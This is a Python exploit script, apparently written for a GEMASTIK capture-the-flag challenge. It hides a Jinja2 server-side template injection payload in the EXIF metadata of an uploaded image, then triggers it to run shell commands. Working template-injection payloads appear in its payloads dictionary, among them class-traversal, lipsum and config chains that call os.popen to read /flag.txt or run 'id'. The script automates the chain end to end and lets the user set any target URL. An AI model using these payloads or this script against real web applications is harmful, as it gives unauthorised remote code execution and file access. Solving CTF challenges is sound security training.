#!/usr/bin/env python3
"""
CDN Challenge - SSTI Exploitation Script
Exploits Server-Side Template Injection vulnerability to read /flag.txt
"""

import requests
import tempfile
import subprocess
import re
import sys
from pathlib import Path
import argparse


def create_malicious_image(payload, use_date_field=False):
    """Create an image with malicious EXIF data"""
    with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
        tmp_path = tmp.name

    # Create a simple white image using ImageMagick
    try:
        subprocess.run(
            ["convert", "-size", "100x100", "xc:white", tmp_path],
            check=True,
            capture_output=True,
        )
    except FileNotFoundError:
        print("[-] ImageMagick 'convert' not found. Installing...")
        print("    Run: sudo apt-get install imagemagick")
        sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to create image: {e}")
        sys.exit(1)

    # Inject malicious EXIF data
    try:
        field = "DateCreated" if use_date_field else "FileName"
        subprocess.run(
            ["exiftool", f"-{field}={payload}", tmp_path],
            check=True,
            capture_output=True,
        )
    except FileNotFoundError:
        print("[-] exiftool not found. Installing...")
        print("    Run: sudo apt-get install libimage-exiftool-perl")
        sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"[-] Failed to inject EXIF data: {e}")
        sys.exit(1)

    # Remove the backup file created by exiftool
    backup = tmp_path + "_original"
    if Path(backup).exists():
        Path(backup).unlink()

    return tmp_path


def exploit(target, username, password, payload_type="flag", use_date_field=False):
    """
    Exploit the SSTI vulnerability

    Args:
        target: Target URL (e.g., http://localhost:4500)
        username: Username to register/login
        password: Password to use
        payload_type: Type of payload (flag, test, rce)
        use_date_field: Use DateCreated field instead of FileName
    """
    session = requests.Session()

    # Define payloads
    payloads = {
        "flag": '{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /flag.txt").read() }}',
        "test": "{{ 7*7 }}",
        "rce": '{{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("id").read() }}',
        "lipsum": '{{ lipsum.__globals__.os.popen("cat /flag.txt").read() }}',
        "config": '{{ config.__class__.__init__.__globals__["os"].popen("cat /flag.txt").read() }}',
    }

    if payload_type not in payloads:
        print(f"[-] Unknown payload type: {payload_type}")
        print(f"[*] Available payloads: {', '.join(payloads.keys())}")
        return

    payload = payloads[payload_type]
    print(f"[*] Using payload: {payload_type}")
    print(f"[*] Target: {target}")

    # Register
    print(f"[*] Registering user: {username}")
    try:
        r = session.post(
            f"{target}/register",
            data={"username": username, "password": password},
            timeout=10,
        )
    except requests.exceptions.RequestException as e:
        print(f"[-] Failed to connect to target: {e}")
        print(f"[*] Make sure the service is running on {target}")
        return

    if "already exists" in r.text:
        print("[*] User already exists, trying to login...")
    elif "Registered" in r.text:
        print("[+] Registration successful")
    else:
        print("[-] Registration failed")
        print(r.text[:200])

    # Login
    print(f"[*] Logging in as {username}...")
    r = session.post(
        f"{target}/login", data={"username": username, "password": password}, timeout=10
    )

    if "Welcome" not in r.text and "gallery" not in r.url:
        print("[-] Login failed")
        print(r.text[:200])
        return

    print("[+] Login successful")

    # Create malicious image
    print("[*] Creating malicious image with EXIF payload...")
    img_path = create_malicious_image(payload, use_date_field)
    print(f"[+] Created malicious image: {img_path}")

    # Upload image
    print("[*] Uploading malicious image...")
    with open(img_path, "rb") as f:
        r = session.post(
            f"{target}/upload",
            data={"title": f"Exploit-{payload_type}"},
            files={"image": ("exploit.png", f, "image/png")},
            timeout=10,
        )

    if "Upload complete" in r.text or "gallery" in r.url:
        print("[+] Upload successful")
    else:
        print("[-] Upload failed")
        print(r.text[:200])
        Path(img_path).unlink()
        return

    # Get post ID from gallery
    print("[*] Fetching gallery to get post ID...")
    r = session.get(f"{target}/gallery", timeout=10)
    post_ids = re.findall(r"/post/(\d+)", r.text)

    if not post_ids:
        print("[-] No posts found in gallery")
        Path(img_path).unlink()
        return

    post_id = post_ids[0]
    print(f"[+] Found post ID: {post_id}")

    # Trigger SSTI
    print(f"[*] Triggering SSTI on post {post_id}...")
    r = session.get(f"{target}/post/{post_id}", timeout=10)

    # Clean up
    Path(img_path).unlink()
    print("[+] Cleaned up temporary image")

    print("\n" + "=" * 60)
    print("EXPLOITATION RESULT")
    print("=" * 60)

    # Try to extract flag
    flag_match = re.search(r"GEMASTIK\{[^}]+\}", r.text)
    if flag_match:
        print(f"\n[+] FLAG FOUND: {flag_match.group()}")
        print("=" * 60)
        return flag_match.group()

    # For test payload, check if we got the result
    if payload_type == "test":
        if "49" in r.text:  # 7*7 = 49
            print("[+] SSTI confirmed! 7*7 = 49 found in response")
            print("[*] Try running with --payload flag to get the flag")
            print("=" * 60)
            return

    # For RCE payload, extract the output
    if payload_type == "rce":
        # Look for uid/gid in response
        uid_match = re.search(r"uid=\d+\([^)]+\)", r.text)
        if uid_match:
            print(f"[+] RCE confirmed! Command output: {uid_match.group()}")
            print("=" * 60)
            return

    # If nothing found, show part of the response
    print("[*] Flag/Result not found in direct extraction")
    print("[*] Checking raw response...\n")

    # Try to find the metadata section
    pre_match = re.search(r"<pre>File Name: (.*?)\n", r.text, re.DOTALL)
    if pre_match:
        result = pre_match.group(1).strip()
        if result and result != "":
            print(f"[+] Extracted result from File Name field:")
            print(result)
            print("=" * 60)
            return result

    # Last resort: show the full response
    print("[*] Full response (first 2000 chars):")
    print(r.text[:2000])
    print("=" * 60)


def main():
    parser = argparse.ArgumentParser(
        description="Exploit SSTI vulnerability in CDN challenge",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Test SSTI with simple math
  python3 exploit.py --payload test
  
  # Get the flag (default)
  python3 exploit.py --payload flag
  
  # Test RCE with id command
  python3 exploit.py --payload rce
  
  # Use alternate payload method
  python3 exploit.py --payload lipsum
  
  # Target different host
  python3 exploit.py --target http://10.0.0.1:4500 --payload flag
        """,
    )

    parser.add_argument(
        "--target",
        "-t",
        default="http://localhost:4500",
        help="Target URL (default: http://localhost:4500)",
    )
    parser.add_argument(
        "--username",
        "-u",
        default="attacker123",
        help="Username to register/login (default: attacker123)",
    )
    parser.add_argument(
        "--password",
        "-p",
        default="password123",
        help="Password to use (default: password123)",
    )
    parser.add_argument(
        "--payload",
        "-P",
        default="flag",
        choices=["flag", "test", "rce", "lipsum", "config"],
        help="Payload type to use (default: flag)",
    )
    parser.add_argument(
        "--use-date-field",
        "-d",
        action="store_true",
        help="Use DateCreated field instead of FileName",
    )

    args = parser.parse_args()

    try:
        exploit(
            args.target, args.username, args.password, args.payload, args.use_date_field
        )
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        import traceback

        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()

